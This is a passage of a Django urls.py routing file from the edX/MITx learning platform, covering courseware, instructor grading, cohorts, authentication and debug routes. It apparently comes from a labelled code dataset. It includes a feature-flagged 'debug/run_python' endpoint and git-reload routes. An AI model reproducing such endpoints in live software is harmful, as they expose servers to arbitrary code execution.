        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
